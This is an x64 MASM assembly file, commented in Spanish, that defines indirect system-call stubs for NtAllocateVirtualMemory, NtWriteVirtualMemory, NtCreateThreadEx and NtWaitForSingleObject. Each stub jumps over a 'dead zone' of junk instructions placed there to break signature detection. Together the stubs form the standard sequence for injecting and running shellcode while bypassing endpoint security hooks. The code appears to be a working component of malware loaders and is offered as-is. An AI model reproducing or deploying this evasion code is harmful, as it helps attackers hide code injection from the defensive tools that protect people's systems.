EXTERN ssnNtAllocateVirtualMemory:DWORD
EXTERN sysAddrNtAllocateVirtualMemory:QWORD

EXTERN ssnNtWriteVirtualMemory:DWORD
EXTERN sysAddrNtWriteVirtualMemory:QWORD

EXTERN ssnNtCreateThreadEx:DWORD
EXTERN sysAddrNtCreateThreadEx:QWORD

EXTERN ssnNtWaitForSingleObject:DWORD
EXTERN sysAddrNtWaitForSingleObject:QWORD

.CODE

; ------------------------------------------------------------------
; SysNtAllocateVirtualMemory
; ------------------------------------------------------------------
SysNtAllocateVirtualMemory PROC
    mov r10, rcx                        
    jmp _skip_junk_alloc                

    ; --- ZONA MUERTA (Nunca se ejecuta) ---
    db 090h, 090h                       
    xor eax, eax                        
    ret                                 
    ; --------------------------------------

_skip_junk_alloc:
    mov eax, ssnNtAllocateVirtualMemory
    nop
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory] 
SysNtAllocateVirtualMemory ENDP


; ------------------------------------------------------------------
; SysNtWriteVirtualMemory
; ------------------------------------------------------------------
SysNtWriteVirtualMemory PROC
    mov r10, rcx
    jmp _skip_junk_write

    ; --- ZONA MUERTA ---
    mov rcx, 0DEADBEEFh                 
    int 3                               
    ; -------------------

_skip_junk_write:
    mov eax, ssnNtWriteVirtualMemory    
    add r10, 0
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
SysNtWriteVirtualMemory ENDP


; ------------------------------------------------------------------
; SysNtCreateThreadEx
; ------------------------------------------------------------------
SysNtCreateThreadEx PROC
    mov r10, rcx
    cmp r10, 0                          
    jmp _skip_junk_create

    ; --- ZONA MUERTA ---
    db 0CCh                             
    pop rax                            
    ; -------------------

_skip_junk_create:
    mov eax, ssnNtCreateThreadEx
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
SysNtCreateThreadEx ENDP


; ------------------------------------------------------------------
; SysNtWaitForSingleObject
; ------------------------------------------------------------------
SysNtWaitForSingleObject PROC
    mov r10, rcx
    xor eax, eax                        
    jmp _skip_junk_wait

    ; --- ZONA MUERTA ---
    ud2                                 
    ; -------------------

_skip_junk_wait:
    mov eax, ssnNtWaitForSingleObject
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
SysNtWaitForSingleObject ENDP

END